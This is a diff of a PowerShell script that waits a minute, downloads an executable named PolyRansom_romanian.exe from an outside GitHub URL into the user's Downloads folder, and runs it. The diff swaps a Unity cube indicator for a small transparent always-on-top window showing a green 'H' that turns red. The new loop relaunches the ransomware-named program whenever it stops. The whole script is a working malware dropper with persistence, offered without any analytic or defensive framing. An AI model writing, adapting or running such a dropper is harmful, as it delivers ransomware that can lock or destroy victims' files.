@@ -1,48 +1,40 @@
-Add-Type -AssemblyName UnityEngine
-
-function CreateCube {
-    param(
-        [string]$name,
-        [string]$color,
-        [int]$size,
-        [int]$x,
-        [int]$y
-    )
-
-    $cube = [UnityEngine.GameObject]::CreatePrimitive("Cube")
-
-    $cube.name = $name
-
-    $cube.transform.position = New-Object UnityEngine.Vector3($x, $y, 0)
-
-    $cube.transform.localScale = New-Object UnityEngine.Vector3($size, $size, $size)
-
-    $cube.GetComponent([UnityEngine.Renderer]).material.color = [UnityEngine.Color]::($color)
-}
-
 $url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
 $downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
 $webClient = New-Object System.Net.WebClient
 
-
 Start-Sleep -Seconds 60
-$webClient.DownloadFile($url, $downloadPath)
 
+$webClient.DownloadFile($url, $downloadPath)
 
 function IsProcessRunning {
     param([string]$processName)
     return Get-Process -Name $processName -ErrorAction SilentlyContinue
 }
 
-# Create a green cube initially
-CreateCube -name "Cube" -color "green" -size 12 -x 10 -y 0
+Add-Type -AssemblyName PresentationFramework
 
-while (-not (Test-Path $downloadPath)) {
+$window = [System.Windows.Window]::new()
+$window.WindowStyle = 'None'
+$window.ResizeMode = 'NoResize'
+$window.AllowsTransparency = $true
+$window.Background = 'Transparent'
+$window.Topmost = $true
+
+$textBlock = [System.Windows.Controls.TextBlock]::new()
+$textBlock.Text = "H"
+$textBlock.FontSize = 20
+$textBlock.Foreground = 'Green'
+$textBlock.Margin = '0,0,20,20'
+$textBlock.HorizontalAlignment = 'Right'
+$textBlock.VerticalAlignment = 'Bottom'
+
+$window.Content = $textBlock
+$window.Show()
+
+while ($true) {
+    if (-not (IsProcessRunning "PolyRansom_romanian")) {
+        $textBlock.Foreground = 'Red'
+        Start-Process -FilePath $downloadPath -Wait
+    }
     Start-Sleep -Milliseconds 100
 }
-
-Start-Sleep -Seconds 60
-$cube = [UnityEngine.GameObject]::Find("Cube")
-$cube.GetComponent([UnityEngine.Renderer]).material.color = [UnityEngine.Color]::red
-
-Start-Process -FilePath $downloadPath -Wait
